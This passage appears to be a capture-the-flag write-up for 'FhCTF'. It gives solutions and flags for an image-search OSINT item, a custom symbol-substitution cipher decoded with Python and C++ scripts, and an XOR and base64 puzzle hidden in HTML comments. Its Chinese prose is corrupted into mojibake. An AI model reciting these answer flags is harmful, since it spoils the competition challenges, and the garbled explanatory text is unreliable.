&lt;h3&gt;[Á∑£]&lt;/h3&gt;
&lt;p&gt;google ‰ª•ÂúñÊêúÂúñÂä†ÈóúÈçµÂ≠ó &amp;lt;ËèØÂ±± Á•≠ÂÖ∏ Âú∞ÂùÄ&amp;gt;
ÂæóÂà∞&lt;img src=&quot;https://hackmd.io/_uploads/HJfIjgzHC.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;FhCTF{108Âè∞ÂåóÂ∏ÇËê¨ËèØÂçÄÂ∫∑ÂÆöË∑Ø173Â∑∑}&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h2&gt;Crypto&lt;/h2&gt;
&lt;h3&gt;[Taiwan No.1]&lt;/h3&gt;
&lt;p&gt;È°åÁõÆÊúâË™™Âà∞ÔºåÊØè‰∏ÄÂÄãÂèØË¶ñÂ≠óÂÖÉÊúâÁç®Á´ãÁöÑÁ∑®Á¢ºÂΩ¢Âºè
ÊàëÂÄëÂè™Ë¶ÅÂ∞áoutputÁ∏ÆÊàê‰∏ÄË°åÔºåÂà©Áî®&lt;code&gt;taiwan-art.py&lt;/code&gt;ÂéªÂÅöÊàêË°®&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;taiwan-art.py&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;Secret = open(&amp;#39;./Secret.txt&amp;#39;, &amp;#39;rb&amp;#39;).read()
encode = &amp;quot;~!@#$%^&amp;amp;*()-=[]\\&amp;quot;
Taiwan = list(open(&amp;#39;./taiwan.txt&amp;#39;, &amp;#39;r&amp;#39;).read())
SuperPower = 13 * 3 * 7 * 5
New_Taiwan = &amp;#39;&amp;#39;
for sec in Secret:
    for prime in [13, 3, 7, 5]:
        for sp in range(SuperPower):
            char = Taiwan.pop(0)
            if char != &amp;quot;#&amp;quot;:
                New_Taiwan += char
            else:
                New_Taiwan += encode[sec % prime]
                break

print(New_Taiwan)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÂàÜÊûê‰∏Ä‰∏ãÊúÉÁôºÁèæÔºå‰ªñÊúÉËÆÄÂèñtaiwan.txtÔºåËÄåtaiwan.txtË¶ÅÊúâ4ÁöÑÂÄçÊï∏ÂÄã&lt;code&gt;#&lt;/code&gt;
ÊàëÂú®&lt;code&gt;Secret.txt&lt;/code&gt;‰∏≠Êâì&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&amp;quot;#$%&amp;amp;&amp;#39;()*+,-./:;&amp;lt;=&amp;gt;?@[]^_`{|}~
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÂèØ‰ª•Áü•ÈÅìÊâÄÊúâÁöÑÂèØË¶ñÂ≠óÂÖÉÁ¨¶ËôüÔºåÊØèÂõõÂÄã‰∏ÄÁµÑÔºåÊ†πÊìöËº∏Âá∫ÂÄºÂéªÊü•Ë°®&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Ë£ΩË°®C++ÔºàË¶ÅÊ†πÊìöSecret.txtÂæÆË™ø‰øÆÊ≠£Ôºâ&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-cpp&quot;&gt;#include &amp;lt;iostream&amp;gt;
using namespace std;
int main()
{
    string re = &amp;quot;~@@~!~#!@!$@#@%#$~^$%!~~^@!!&amp;amp;~@@*!##(@$$)~%~-!^!=@~@~~!#!!@$@@#~#~$!$!%@%@^#^~~$&amp;amp;!!~*@@!(~#@)!$#-@%$=~^~&amp;quot;;
    string abc =&amp;quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&amp;quot;;
    for(int i=0;i&amp;lt;104;i+=4){
        cout&amp;lt;&amp;lt;abc[i/4]&amp;lt;&amp;lt;&amp;quot;:&amp;quot;&amp;lt;&amp;lt;re[i]&amp;lt;&amp;lt;re[i+1]&amp;lt;&amp;lt;re[i+2]&amp;lt;&amp;lt;re[i+3]&amp;lt;&amp;lt;&amp;quot;\n&amp;quot;;
    }
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;pythonËß£&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;stardand={&amp;#39;0&amp;#39;:&amp;quot;(~^#&amp;quot;,&amp;#39;1&amp;#39;:&amp;quot;)!~$&amp;quot;,&amp;#39;2&amp;#39;:&amp;quot;-@!~&amp;quot;,&amp;#39;3&amp;#39;:&amp;quot;=~@!&amp;quot;,&amp;#39;4&amp;#39;:&amp;quot;~!#@&amp;quot;,&amp;#39;5&amp;#39;:&amp;quot;!@$#&amp;quot;,&amp;#39;6&amp;#39;:&amp;quot;@~%$&amp;quot;,&amp;#39;7&amp;#39;:&amp;quot;#!^~&amp;quot;,&amp;#39;8&amp;#39;:&amp;quot;$@~!&amp;quot;,&amp;#39;9&amp;#39;:&amp;quot;%~!@&amp;quot;,&amp;#39;a&amp;#39;:&amp;quot;^!^@&amp;quot;,&amp;#39;b&amp;#39;:&amp;quot;&amp;amp;@~#&amp;quot;,&amp;#39;c&amp;#39;:&amp;quot;*~!$&amp;quot;,&amp;#39;d&amp;#39;:&amp;quot;(!@~&amp;quot;,&amp;#39;e&amp;#39;:&amp;quot;)@#!&amp;quot;,&amp;#39;f&amp;#39;:&amp;quot;-~$@&amp;quot;,&amp;#39;g&amp;#39;:&amp;quot;=!%#&amp;quot;,&amp;#39;h&amp;#39;:&amp;quot;~@^$&amp;quot;,&amp;#39;i&amp;#39;:&amp;quot;!~~~&amp;quot;,&amp;#39;j&amp;#39;:&amp;quot;@!!!&amp;quot;,&amp;#39;k&amp;#39;:&amp;quot;#@@@&amp;quot;,&amp;#39;l&amp;#39;:&amp;quot;$~##&amp;quot;,&amp;#39;m&amp;#39;:&amp;quot;%!$$&amp;quot;,&amp;#39;n&amp;#39;:&amp;quot;^@%~&amp;quot;,&amp;#39;o&amp;#39;:&amp;quot;&amp;amp;~^!&amp;quot;,&amp;#39;p&amp;#39;:&amp;quot;*!~@&amp;quot;,&amp;#39;q&amp;#39;:&amp;quot;(@!#&amp;quot;,&amp;#39;r&amp;#39;:&amp;quot;)~@$&amp;quot;,&amp;#39;s&amp;#39;:&amp;quot;-!#~&amp;quot;,&amp;#39;t&amp;#39;:&amp;quot;=@$!&amp;quot;,&amp;#39;u&amp;#39;:&amp;quot;~~%@&amp;quot;,&amp;quot;v&amp;quot;:&amp;quot;!!^#&amp;quot;,&amp;#39;w&amp;#39;:&amp;quot;@@~$&amp;quot;,&amp;#39;x&amp;#39;:&amp;quot;#~!~&amp;quot;,&amp;#39;y&amp;#39;:&amp;quot;$!@!&amp;quot;,&amp;#39;z&amp;#39;:&amp;quot;%@#@&amp;quot;,&amp;#39;A&amp;#39;:&amp;quot;~@@~&amp;quot;,&amp;#39;B&amp;#39;:&amp;quot;!~#!&amp;quot;,&amp;#39;C&amp;#39;:&amp;quot;@!$@&amp;quot;,&amp;#39;D&amp;#39;:&amp;quot;#@%#&amp;quot;,&amp;#39;E&amp;#39;:&amp;quot;$~^$&amp;quot;,&amp;#39;F&amp;#39;:&amp;quot;%!~~&amp;quot;,&amp;#39;G&amp;#39;:&amp;quot;^@!!&amp;quot;,&amp;#39;H&amp;#39;:&amp;quot;&amp;amp;~@@&amp;quot;,&amp;#39;I&amp;#39;:&amp;quot;*!##&amp;quot;,&amp;#39;J&amp;#39;:&amp;quot;(@$$&amp;quot;,&amp;#39;K&amp;#39;:&amp;quot;)~%~&amp;quot;,&amp;#39;L&amp;#39;:&amp;quot;-!^!&amp;quot;,&amp;#39;M&amp;#39;:&amp;quot;=@~@&amp;quot;,&amp;#39;N&amp;#39;:&amp;quot;~~!#&amp;quot;,&amp;#39;O&amp;#39;:&amp;quot;!!@$&amp;quot;,&amp;#39;P&amp;#39;:&amp;quot;@@#~&amp;quot;,&amp;#39;Q&amp;#39;:&amp;quot;#~$!&amp;quot;,&amp;#39;R&amp;#39;:&amp;quot;$!%@&amp;quot;,&amp;quot;S&amp;quot;:&amp;quot;%@^#&amp;quot;,&amp;#39;T&amp;#39;:&amp;quot;^~~$&amp;quot;,&amp;#39;U&amp;#39;:&amp;quot;&amp;amp;!!~&amp;quot;,&amp;#39;V&amp;#39;:&amp;quot;*@@!&amp;quot;,&amp;#39;W&amp;#39;:&amp;quot;(~#@&amp;quot;,&amp;#39;X&amp;#39;:&amp;quot;)!$#&amp;quot;,&amp;#39;Y&amp;#39;:&amp;quot;-@%$&amp;quot;,&amp;#39;Z&amp;#39;:&amp;quot;=~^~&amp;quot;,&amp;#39;!&amp;#39;:&amp;quot;&amp;amp;~%#&amp;quot;,&amp;#39;&amp;quot;&amp;#39;:&amp;quot;*!^$&amp;quot;,&amp;#39;#&amp;#39;:&amp;quot;(@~~&amp;quot;,&amp;#39;$&amp;#39;:&amp;quot;)~!!&amp;quot;,&amp;#39;%&amp;#39;:&amp;quot;-!@@&amp;quot;,&amp;#39;&amp;amp;&amp;#39;:&amp;quot;=@##&amp;quot;,&amp;quot;&amp;#39;&amp;quot;:&amp;quot;~~$$&amp;quot;,&amp;#39;(&amp;#39;:&amp;quot;!!%~&amp;quot;,&amp;#39;)&amp;#39;:&amp;quot;@@^!&amp;quot;,&amp;#39;*&amp;#39;:&amp;quot;#~~@&amp;quot;,&amp;#39;+&amp;#39;:&amp;quot;$!!#&amp;quot;,&amp;#39;,&amp;#39;:&amp;quot;%@@$&amp;quot;,&amp;#39;-&amp;#39;:&amp;quot;^~#~&amp;quot;,&amp;#39;.&amp;#39;:&amp;quot;&amp;amp;!$!&amp;quot;,&amp;#39;/&amp;#39;:&amp;quot;*@%@&amp;quot;,&amp;quot;&amp;#39;&amp;quot;:&amp;quot;^!@#&amp;quot;,&amp;#39;;&amp;#39;:&amp;quot;&amp;amp;@#$&amp;quot;,&amp;#39;&amp;lt;&amp;#39;:&amp;quot;*~$~&amp;quot;,&amp;#39;=&amp;#39;:&amp;quot;(!%!&amp;quot;,&amp;#39;&amp;gt;&amp;#39;:&amp;quot;)@^@&amp;quot;,&amp;#39;?&amp;#39;:&amp;quot;-~~#&amp;quot;,&amp;#39;@&amp;#39;:&amp;quot;=!!$&amp;quot;,&amp;#39;[&amp;#39;:&amp;quot;~!~!&amp;quot;,&amp;#39;]&amp;#39;:&amp;quot;@~@#&amp;quot;,&amp;#39;^&amp;#39;:&amp;quot;#!#$&amp;quot;,&amp;#39;_&amp;#39;:&amp;quot;$@$~&amp;quot;,&amp;#39;`&amp;#39;:&amp;quot;%~%!&amp;quot;,&amp;#39;{&amp;#39;:&amp;quot;^~$#&amp;quot;,&amp;#39;|&amp;#39;:&amp;quot;&amp;amp;!%$&amp;quot;,&amp;#39;}&amp;#39;:&amp;quot;*@^~&amp;quot;,&amp;#39;~&amp;#39;:&amp;quot;(~~!&amp;quot;}
transform={
    v:k for k,v in stardand.items()
}
message=&amp;quot;@!$@&amp;amp;~^!^@%~=!%#)~@$^!^@=@$!~~%@$~##^!^@=@$!!~~~&amp;amp;~^!^@%~-!#~^@$@&amp;amp;~^!^@%~^@$@-!#~&amp;amp;~^!$~##!!^#!~~~^@%~=!%#^@$@=@$!~@^$!~~~-!#~^@$@*~!$~@^$^!^@$~##$~##)@#!^@%~=!%#)@#!&amp;amp;~%#^@$@~!^#)!#~^~~$~@^$)@#!^@$@%!$$^!^@-!#~#@@@^@$@~@^$^!^@-!#~)!~$$@~!=~@!@~%$^@$@(@~~~~$$-!#~^@$@-!#~&amp;amp;~^!^@$@~@^$)@#!)~@$)@#!^@$@^!^@)~@$)@#!^@$@-!#~&amp;amp;~^!%!$$)@#!^@$@)~@$^!^@^@%~(!@~&amp;amp;~^!%!$$^@$@@@~$&amp;amp;~^!)~@$(!@~-!#~^@$@=@$!&amp;amp;~^!^@$@%!$$^!^@#@@@)@#!^@$@=@$!~@^$)@#!^@$@%!$$)@#!-!#~-!#~^!^@=!%#)@#!^@$@$~##&amp;amp;~^!^@%~=!%#^@$@)@#!^@%~&amp;amp;~^!~~%@=!%#~@^$&amp;amp;!$!~!^#)!#~@!$@&amp;amp;~^!^@%~-~$@$~##!~~~*~!$=@$!^@$@%!$$~~%@-!#~=@$!^@$@^@%~&amp;amp;~^!=@$!^@$@&amp;amp;@~#)@#!^@$@-!#~)@#!)@#!^@%~^@$@=@$!~@^$)~@$&amp;amp;~^!~~%@=!%#~@^$^@$@=@$!~@^$)@#!^@$@&amp;amp;~@@&amp;amp;~^!$~##$!@!^@$@)~%~~@^$^!^@$~##^!^@&amp;amp;!$!~!^#)!#~(~#@)@#!^@$@-!#~~@^$^!^@$~##$~##^@$@)~@$!~~~-!#~)@#!^@$@-~$@)~@$&amp;amp;~^!%!$$^@$@=@$!~@^$)@#!^@$@^!^@-!#~~@^$)@#!-!#~&amp;amp;!$!=@~@$!@!^@$@~@^$)@#!^!^@)~@$=@$!^@$@!~~~-!#~^@$@*~!$&amp;amp;~^!$~##(!@~)@#!)~@$^@$@=@$!~@^$^!^@^@%~^@$@=@$!~@^$)@#!-!#~)@#!^@$@-!#~=@$!)@#!)@#!$~##^@$@$~##!~~~%!$$&amp;amp;@~#-!#~&amp;amp;!$!~!^#)!#~@@#~)~@$!~~~-!#~%!$$^!^@=@$!!~~~*~!$^@$@*~!$&amp;amp;~^!)~@$)@#!^@$@-~$@^!^@!~~~$~##!~~~^@%~=!%#&amp;amp;~%#^@$@(~#@)@#!^@$@)~@$)@#!(@!#~~%@!~~~)~@$)@#!^@$@^!^@-!#~-!#~!~~~-!#~=@$!^!^@^@%~*~!$)@#!&amp;amp;!$!~!^#)!#~-@%$&amp;amp;~^!~~%@)~@$^@$@-~$@$~##^!^@=!%#^@$@!~~~-!#~^@$@~@^$)@#!)~@$)@#!^!@#^@$@%!~~~@^$@!$@^~~$%!~~^~$#-!^!!~~~!!^#=~@!(!@~$@$~)!~$^@%~$@$~^~~$~!#@)!~$@@~$=~@!^@%~$@$~^@!!&amp;amp;~^!&amp;amp;~^!(~^#(~^#&amp;amp;~^!&amp;amp;~^!(~^#(~^#(!@~*@^~&amp;quot;
result=&amp;#39;&amp;#39;
for i in range(0,len(message),4):
    ans=message[i:i+4]
    if ans in transform:
        result+=transform[ans]
print(result)
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;C++Ëß£&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-cpp&quot;&gt;#include &amp;lt;iostream&amp;gt;
#include &amp;lt;string&amp;gt;
#include &amp;lt;unordered_map&amp;gt;
using namespace std;
int main() {
    unordered_map&amp;lt;char, string&amp;gt; encode_map = {
        {&amp;#39;0&amp;#39;, &amp;quot;(~^#&amp;quot;}, {&amp;#39;1&amp;#39;, &amp;quot;)!~$&amp;quot;}, {&amp;#39;2&amp;#39;, &amp;quot;-@!~&amp;quot;}, {&amp;#39;3&amp;#39;, &amp;quot;=~@!&amp;quot;}, {&amp;#39;4&amp;#39;, &amp;quot;~!#@&amp;quot;},
        {&amp;#39;5&amp;#39;, &amp;quot;!@$#&amp;quot;}, {&amp;#39;6&amp;#39;, &amp;quot;@~%$&amp;quot;}, {&amp;#39;7&amp;#39;, &amp;quot;#!^~&amp;quot;}, {&amp;#39;8&amp;#39;, &amp;quot;$@~!&amp;quot;}, {&amp;#39;9&amp;#39;, &amp;quot;%~!@&amp;quot;},
        {&amp;#39;a&amp;#39;, &amp;quot;^!^@&amp;quot;}, {&amp;#39;b&amp;#39;, &amp;quot;&amp;amp;@~#&amp;quot;}, {&amp;#39;c&amp;#39;, &amp;quot;*~!$&amp;quot;}, {&amp;#39;d&amp;#39;, &amp;quot;(!@~&amp;quot;}, {&amp;#39;e&amp;#39;, &amp;quot;)@#!&amp;quot;},
        {&amp;#39;f&amp;#39;, &amp;quot;-~$@&amp;quot;}, {&amp;#39;g&amp;#39;, &amp;quot;=!%#&amp;quot;}, {&amp;#39;h&amp;#39;, &amp;quot;~@^$&amp;quot;}, {&amp;#39;i&amp;#39;, &amp;quot;!~~~&amp;quot;}, {&amp;#39;j&amp;#39;, &amp;quot;@!!!&amp;quot;},
        {&amp;#39;k&amp;#39;, &amp;quot;#@@@&amp;quot;}, {&amp;#39;l&amp;#39;, &amp;quot;$~##&amp;quot;}, {&amp;#39;m&amp;#39;, &amp;quot;%!$$&amp;quot;}, {&amp;#39;n&amp;#39;, &amp;quot;^@%~&amp;quot;}, {&amp;#39;o&amp;#39;, &amp;quot;&amp;amp;~^!&amp;quot;},
        {&amp;#39;p&amp;#39;, &amp;quot;*!~@&amp;quot;}, {&amp;#39;q&amp;#39;, &amp;quot;(@!#&amp;quot;}, {&amp;#39;r&amp;#39;, &amp;quot;)~@$&amp;quot;}, {&amp;#39;s&amp;#39;, &amp;quot;-!#~&amp;quot;}, {&amp;#39;t&amp;#39;, &amp;quot;=@$!&amp;quot;},
        {&amp;#39;u&amp;#39;, &amp;quot;~~%@&amp;quot;}, {&amp;#39;v&amp;#39;, &amp;quot;!!^#&amp;quot;}, {&amp;#39;w&amp;#39;, &amp;quot;@@~$&amp;quot;}, {&amp;#39;x&amp;#39;, &amp;quot;#~!~&amp;quot;}, {&amp;#39;y&amp;#39;, &amp;quot;$!@!&amp;quot;},
        {&amp;#39;z&amp;#39;, &amp;quot;%@#@&amp;quot;}, {&amp;#39;A&amp;#39;, &amp;quot;~@@~&amp;quot;}, {&amp;#39;B&amp;#39;, &amp;quot;!~#!&amp;quot;}, {&amp;#39;C&amp;#39;, &amp;quot;@!$@&amp;quot;}, {&amp;#39;D&amp;#39;, &amp;quot;#@%#&amp;quot;},
        {&amp;#39;E&amp;#39;, &amp;quot;$~^$&amp;quot;}, {&amp;#39;F&amp;#39;, &amp;quot;%!~~&amp;quot;}, {&amp;#39;G&amp;#39;, &amp;quot;^@!!&amp;quot;}, {&amp;#39;H&amp;#39;, &amp;quot;&amp;amp;~@@&amp;quot;}, {&amp;#39;I&amp;#39;, &amp;quot;*!##&amp;quot;},
        {&amp;#39;J&amp;#39;, &amp;quot;(@$$&amp;quot;}, {&amp;#39;K&amp;#39;, &amp;quot;)~%~&amp;quot;}, {&amp;#39;L&amp;#39;, &amp;quot;-!^!&amp;quot;}, {&amp;#39;M&amp;#39;, &amp;quot;=@~@&amp;quot;}, {&amp;#39;N&amp;#39;, &amp;quot;~~!#&amp;quot;},
        {&amp;#39;O&amp;#39;, &amp;quot;!!@$&amp;quot;}, {&amp;#39;P&amp;#39;, &amp;quot;@@#~&amp;quot;}, {&amp;#39;Q&amp;#39;, &amp;quot;#~$!&amp;quot;}, {&amp;#39;R&amp;#39;, &amp;quot;$!%@&amp;quot;}, {&amp;#39;S&amp;#39;, &amp;quot;%@^#&amp;quot;},
        {&amp;#39;T&amp;#39;, &amp;quot;^~~$&amp;quot;}, {&amp;#39;U&amp;#39;, &amp;quot;&amp;amp;!!~&amp;quot;}, {&amp;#39;V&amp;#39;, &amp;quot;*@@!&amp;quot;}, {&amp;#39;W&amp;#39;, &amp;quot;(~#@&amp;quot;}, {&amp;#39;X&amp;#39;, &amp;quot;)!$#&amp;quot;},
        {&amp;#39;Y&amp;#39;, &amp;quot;-@%$&amp;quot;}, {&amp;#39;Z&amp;#39;, &amp;quot;=~^~&amp;quot;}, {&amp;#39;!&amp;#39;, &amp;quot;&amp;amp;~%#&amp;quot;}, {&amp;#39;&amp;quot;&amp;#39;, &amp;quot;*!^$&amp;quot;}, {&amp;#39;#&amp;#39;, &amp;quot;(@~~&amp;quot;},
        {&amp;#39;$&amp;#39;, &amp;quot;)~!!&amp;quot;}, {&amp;#39;%&amp;#39;, &amp;quot;-!@@&amp;quot;}, {&amp;#39;&amp;amp;&amp;#39;, &amp;quot;=@##&amp;quot;}, {&amp;#39;\&amp;#39;&amp;#39;, &amp;quot;~~$$&amp;quot;}, {&amp;#39;(&amp;#39;, &amp;quot;!!%~&amp;quot;},
        {&amp;#39;)&amp;#39;, &amp;quot;@@^!&amp;quot;}, {&amp;#39;*&amp;#39;, &amp;quot;#~~@&amp;quot;}, {&amp;#39;+&amp;#39;, &amp;quot;$!!#&amp;quot;}, {&amp;#39;,&amp;#39;, &amp;quot;%@@$&amp;quot;}, {&amp;#39;-&amp;#39;, &amp;quot;^~#~&amp;quot;},
        {&amp;#39;.&amp;#39;, &amp;quot;&amp;amp;!$!&amp;quot;}, {&amp;#39;/&amp;#39;, &amp;quot;*@%@&amp;quot;}, {&amp;#39;:&amp;#39;, &amp;quot;^!@#&amp;quot;}, {&amp;#39;;&amp;#39;, &amp;quot;&amp;amp;@#$&amp;quot;}, {&amp;#39;&amp;lt;&amp;#39;, &amp;quot;*~$~&amp;quot;},
        {&amp;#39;=&amp;#39;, &amp;quot;(!%!&amp;quot;}, {&amp;#39;&amp;gt;&amp;#39;, &amp;quot;)@^@&amp;quot;}, {&amp;#39;?&amp;#39;, &amp;quot;-~~#&amp;quot;}, {&amp;#39;@&amp;#39;, &amp;quot;=!!$&amp;quot;}, {&amp;#39;[&amp;#39;, &amp;quot;~!~!&amp;quot;},
        {&amp;#39;]&amp;#39;, &amp;quot;@~@#&amp;quot;}, {&amp;#39;^&amp;#39;, &amp;quot;#!#$&amp;quot;}, {&amp;#39;_&amp;#39;, &amp;quot;$@$~&amp;quot;}, {&amp;#39;`&amp;#39;, &amp;quot;%~%!&amp;quot;}, {&amp;#39;{&amp;#39;, &amp;quot;^~$#&amp;quot;},
        {&amp;#39;|&amp;#39;, &amp;quot;&amp;amp;!%$&amp;quot;}, {&amp;#39;}&amp;#39;, &amp;quot;*@^~&amp;quot;}, {&amp;#39;~&amp;#39;, &amp;quot;(~~!&amp;quot;}
    };
    unordered_map&amp;lt;string, char&amp;gt; decode_map;
    for (const auto&amp;amp; pair : encode_map) {
        decode_map[pair.second] = pair.first;
    }
    string encoded_message = &amp;quot;@!$@&amp;amp;~^!^@%~=!%#)~@$^!^@=@$!~~%@$~##^!^@=@$!!~~~&amp;amp;~^!^@%~-!#~^@$@&amp;amp;~^!^@%~^@$@-!#~&amp;amp;~^!$~##!!^#!~~~^@%~=!%#^@$@=@$!~@^$!~~~-!#~^@$@*~!$~@^$^!^@$~##$~##)@#!^@%~=!%#)@#!&amp;amp;~%#^@$@~!^#)!#~^~~$~@^$)@#!^@$@%!$$^!^@-!#~#@@@^@$@~@^$^!^@-!#~)!~$$@~!=~@!@~%$^@$@(@~~~~$$-!#~^@$@-!#~&amp;amp;~^!^@$@~@^$)@#!)~@$)@#!^@$@^!^@)~@$)@#!^@$@-!#~&amp;amp;~^!%!$$)@#!^@$@)~@$^!^@^@%~(!@~&amp;amp;~^!%!$$^@$@@@~$&amp;amp;~^!)~@$(!@~-!#~^@$@=@$!&amp;amp;~^!^@$@%!$$^!^@#@@@)@#!^@$@=@$!~@^$)@#!^@$@%!$$)@#!-!#~-!#~^!^@=!%#)@#!^@$@$~##&amp;amp;~^!^@%~=!%#^@$@)@#!^@%~&amp;amp;~^!~~%@=!%#~@^$&amp;amp;!$!~!^#)!#~@!$@&amp;amp;~^!^@%~-~$@$~##!~~~*~!$=@$!^@$@%!$$~~%@-!#~=@$!^@$@^@%~&amp;amp;~^!=@$!^@$@&amp;amp;@~#)@#!^@$@-!#~)@#!)@#!^@%~^@$@=@$!~@^$)~@$&amp;amp;~^!~~%@=!%#~@^$^@$@=@$!~@^$)@#!^@$@$~##)@#!^@%~-!#~)@#!-!#~^@$@&amp;amp;~^!-~$@^@$@(!@~)@#!-!#~*!~@)@#!)~@$^!^@=@$!!~~~&amp;amp;~^!^@%~&amp;amp;!$!~!^#)!#~~@@~$~##$~##^@$@*!~@^!^@=@$!~@^$-!#~^@$@^!^@)~@$)@#!^@$@-!#~)@#!)@#!^@%~^@$@=@$!~@^$)~@$&amp;amp;~^!~~%@=!%#~@^$^@$@=@$!~@^$)@#!^@$@*!~@)~@$!~~~-!#~%!$$^@$@&amp;amp;~^!-~$@^@$@-~$@^!^@=@$!)@#!&amp;amp;!$!~!^#)!#~!!@$~~%@)~@$^@$@@@~$!~~~$~##$~##-!#~^@$@^!^@)~@$)@#!^@$@^!^@$~##!~~~=!%#^@%~)@#!(!@~^@$@=@$!~@^$)~@$&amp;amp;~^!~~%@=!%#~@^$^@$@=@$!~@^$)@#!^@$@&amp;amp;~@@&amp;amp;~^!$~##$!@!^@$@)~%~~@^$^!^@$~##^!^@&amp;amp;!$!~!^#)!#~(~#@)@#!^@$@-!#~~@^$^!^@$~##$~##^@$@)~@$!~~~-!#~)@#!^@$@-~$@)~@$&amp;amp;~^!%!$$^@$@=@$!~@^$)@#!^@$@^!^@-!#~~@^$)@#!-!#~&amp;amp;!$!=@~@$!@!^@$@~@^$)@#!^!^@)~@$=@$!^@$@!~~~-!#~^@$@*~!$&amp;amp;~^!$~##(!@~)@#!)~@$^@$@=@$!~@^$^!^@^@%~^@$@=@$!~@^$)@#!-!#~)@#!^@$@-!#~=@$!)@#!)@#!$~##^@$@$~##!~~~%!$$&amp;amp;@~#-!#~&amp;amp;!$!~!^#)!#~@@#~)~@$!~~~-!#~%!$$^!^@=@$!!~~~*~!$^@$@*~!$&amp;amp;~^!)~@$)@#!^@$@-~$@^!^@!~~~$~##!~~~^@%~=!%#&amp;amp;~%#^@$@(~#@)@#!^@$@)~@$)@#!(@!#~~%@!~~~)~@$)@#!^@$@^!^@-!#~-!#~!~~~-!#~=@$!^!^@^@%~*~!$)@#!&amp;amp;!$!~!^#)!#~-@%$&amp;amp;~^!~~%@)~@$^@$@-~$@$~##^!^@=!%#^@$@!~~~-!#~^@$@~@^$)@#!)~@$)@#!^!@#^@$@%!~~~@^$@!$@^~~$%!~~^~$#-!^!!~~~!!^#=~@!(!@~$@$~)!~$^@%~$@$~^~~$~!#@)!~$@@~$=~@!^@%~$@$~^@!!&amp;amp;~^!&amp;amp;~^!(~^#(~^#&amp;amp;~^!&amp;amp;~^!(~^#(~^#(!@~*@^~&amp;quot;;
    string decoded_message;
    for (size_t i = 0; i &amp;lt; encoded_message.length(); i += 4) {
        string encoded_char = encoded_message.substr(i, 4);
        if (decode_map.count(encoded_char) &amp;gt; 0) {
            decoded_message += decode_map[encoded_char];
        }
    }
    cout &amp;lt;&amp;lt; &amp;quot;Decoded message: &amp;quot; &amp;lt;&amp;lt; decoded_message &amp;lt;&amp;lt; endl;
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;FLAG:&lt;code&gt;FhCTF{Liv3d_1n_T41w3n_Goo00oo00d}&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h2&gt;MISC&lt;/h2&gt;
&lt;h3&gt;[Welcome]&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/SkBuAxGrC.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h3&gt;[Survey]&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;Â∞±ÊòØË°®ÂñÆ&lt;/code&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h3&gt;[INDEX Ëàá RULES ÁöÑÂ∑ÆÈõÜ]&lt;/h3&gt;
&lt;p&gt;Âà∞index‰∏≠ÁôºÁèæxorkey
‰ΩÜÊòØÂú®Á∂ìÈÅébase64 decodeÂæåÊòØ&lt;code&gt;FhCTF{H3l1o &amp;lt;-- part 1/2&lt;/code&gt;
Âú®rules‰∏≠ÁôºÁèæ&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;!-- crypt value --&amp;gt;
&amp;lt;!-- 192b741219293d0209041200000000000000000000030000 --&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÂÜçÂéªËß£xor
ÂÖ∂‰∏ÄËß£Ôºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;import base64
base64_something = &amp;quot;RmhDVEZ7SDNsMW8gPC0tIHBhcnQgMS8y&amp;quot;
crypt_value_hex = &amp;quot;192b741219293d0209041200000000000000000000030000&amp;quot;
xorkey = base64.b64decode(base64_something)
crypt_value = bytes.fromhex(crypt_value_hex)
repeated_xorkey = (xorkey * ((len(crypt_value) // len(xorkey)) + 1))[:len(crypt_value)]
second_bytes = bytes(a ^ b for a, b in zip(crypt_value, repeated_xorkey))
second = second_bytes.decode(&amp;#39;utf-8&amp;#39;, errors=&amp;#39;ignore&amp;#39;)
print(xorkey,second)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÂÖ∂‰∫åËß£Ôºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;import base64
from pwn import *
base64_something = &amp;quot;RmhDVEZ7SDNsMW8gPC0tIHBhcnQgMS8y&amp;quot;
crypt_value_hex = &amp;quot;192b741219293d0209041200000000000000000000030000&amp;quot;
xorkey = base64.b64decode(base64_something)
crypt_value = bytes.fromhex(crypt_value_hex)
print(xor(xorkey, crypt_value))
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Âá∫‰æÜ‰∫ÜÁ¨¨‰∫åÊÆµÔºö&lt;code&gt;b&amp;#39;_C7F_Ru1e5} &amp;lt;-- part 2/2&amp;#39;&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;FLAG:&lt;code&gt;FhCTF{H3l1ob&amp;#39;_C7F_Ru1e5}&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
